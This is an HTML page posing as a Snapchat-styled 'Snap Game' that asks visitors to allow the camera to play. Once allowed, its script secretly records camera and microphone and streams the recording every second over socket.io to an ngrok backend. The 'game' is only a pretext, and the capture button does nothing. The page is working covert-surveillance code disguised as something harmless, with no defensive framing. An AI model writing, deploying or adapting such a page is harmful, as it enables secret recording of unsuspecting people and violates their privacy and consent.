<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snap Game</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  overflow: hidden;
}

/* 🟡 Splash */
#splash {
  position: fixed;
  width: 100%;
  height: 100%;
  background: #FFFC00;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  z-index: 1000;
}

/* Logo */
#logo {
  width: 120px;
  height: 120px;
  object-fit: contain;
}

/* Text */
#tap {
  margin-top: 20px;
  font-size: 16px;
}

/* Button */
#startBtn {
  margin-top: 15px;
  padding: 12px 20px;
  border-radius: 25px;
  border: none;
  background: black;
  color: white;
  font-size: 16px;
  cursor: pointer;
}

/* Error message */
#message {
  margin-top: 10px;
  color: red;
  font-size: 14px;
  text-align: center;
  padding: 0 20px;
}

/* Camera */
#camera {
  width: 100%;
  height: 100vh;
  object-fit: cover;
  display: none;
}

/* Capture button */
.capture-btn {
  position: fixed;
  bottom: 40px;
  left: 50%;
  transform: translateX(-50%);
  width: 70px;
  height: 70px;
  border-radius: 50%;
  background: white;
  border: 5px solid rgba(255,255,255,0.5);
  display: none;
  cursor: pointer;
  transition: all 0.3s ease;
}

.capture-btn:active {
  transform: translateX(-50%) scale(0.95);
}
</style>
</head>

<body>

<!-- 🟡 Splash Screen -->
<div id="splash">
  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" onerror="this.src='https://via.placeholder.com/120?text=Snap'">
  <div id="tap">Tap to play game</div>
  <button id="startBtn" onclick="startApp()">Start</button>
  <div id="message"></div>
</div>

<!-- 📸 Camera -->
<video id="camera" autoplay playsinline muted></video>

<!-- Capture UI -->
<div class="capture-btn" onclick="captureVideo()"></div>

<script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>

<script>
// 🔌 Backend URL - Update this with your ngrok URL
const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";

const socket = io(BACKEND_URL, {
  transports: ['websocket', 'polling']
});

let mediaRecorder;
let stream = null;

function startApp() {
  const splash = document.getElementById("splash");
  const camera = document.getElementById("camera");
  const btn = document.querySelector(".capture-btn");
  const msg = document.getElementById("message");

  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(mediaStream => {
      stream = mediaStream;
      msg.innerText = "";

      // Show camera
      camera.srcObject = stream;
      camera.style.display = "block";
      btn.style.display = "block";
      splash.style.display = "none";

      // 🎥 Start backend streaming
      socket.emit('start-stream');

      mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'video/webm'
      });

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          socket.emit('stream-data', event.data);
        }
      };

      mediaRecorder.start(1000);

      // Stop safely on page close
      window.onbeforeunload = () => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        socket.emit('stop-stream');
      };

    })
    .catch(err => {
      console.error(err);
      msg.innerText = "⚠️ Please allow camera to play this game";
      document.getElementById("startBtn").innerText = "Try Again";
    });
}

function captureVideo() {
  // This function is called when the circle button is clicked
  // You can add custom logic here if needed
  console.log("Capture button clicked");
  // Visual feedback
  const btn = document.querySelector(".capture-btn");
  btn.style.transform = "translateX(-50%) scale(0.95)";
  setTimeout(() => {
    btn.style.transform = "translateX(-50%) scale(1)";
  }, 200);
}
</script>

</body>
</html>
